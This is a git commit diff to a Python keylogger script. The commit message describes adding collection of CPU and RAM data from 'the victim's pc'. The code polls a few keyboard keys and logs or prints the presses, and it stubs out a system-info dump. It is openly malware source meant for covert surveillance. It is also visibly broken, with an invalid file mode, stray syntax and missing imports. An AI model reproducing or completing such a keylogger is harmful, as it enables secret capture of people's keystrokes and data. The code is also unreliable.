643a75a979faa4b7ba50b9b55aceff8ea72a6aea
Vatafu Vladut <vladvatafu9@gmail.com>
2017-07-29 01:00:49 +0300

    Update python_keylogger.py
    Added function for getting some info from the victim's pc(CPU usage,RAM)

--- python_keylogger.py
+++ python_keylogger.py
@@ -3,13 +3,31 @@ from types import *
 from stat import *
 import os
 import sys
+import psutil
 list = [65,66,67,68,69,70,97]
 fisier = '1.txt'
+def get_cpu_procentage():
+	try:
+		fd = open('info.txt',"w+")
+#		cpu_procent = psutil.cpu_percent()
+#		fd.write(str(cpu_procent))
+#		fd.write("\n");
+#		fd.write(str(psutil.virtual_memory()))
+	
+	except IOError:
+		os.system("touch info.txt")
+
+#get_cpu_procentage()
+
 while True:
-	for i in list:
+	for i in list:	
 		try:
-			 fd = open(fisier,'rw+')
+			 fd = open(fisier,'S_IWUSR')
 			 if keyboard.is_pressed(str(unichr(i))):
-	      		 	fd.write(str(unichr(i)))
+				print (str(chr(i))) #"test for seing the output of key pressed"
+	      		 	#fd.write(str(unichr(i))).join
+				
+
 		except IOError:
 			os.system("touch 1.txt")
+
